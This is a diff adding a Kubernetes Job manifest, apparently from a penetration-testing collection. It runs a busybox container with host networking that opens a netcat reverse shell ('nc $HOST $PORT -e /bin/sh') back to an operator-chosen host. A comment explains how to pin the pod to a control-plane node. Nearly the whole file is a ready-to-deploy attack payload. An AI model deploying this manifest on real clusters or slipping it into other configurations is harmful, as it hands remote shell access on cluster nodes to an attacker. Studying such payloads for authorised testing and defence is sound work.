@@ -1,0 +1,19 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: hostnetwork-revshell-job
+  labels:
+    app: pentest
+    type: job
+spec:
+  template:
+    spec:
+      hostNetwork: true
+      containers:
+      - name: hostnetwork-revshell-job
+        image: busybox
+        command: [ "/bin/sh", "-c", "--" ]
+        args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+
+      restartPolicy: OnFailure
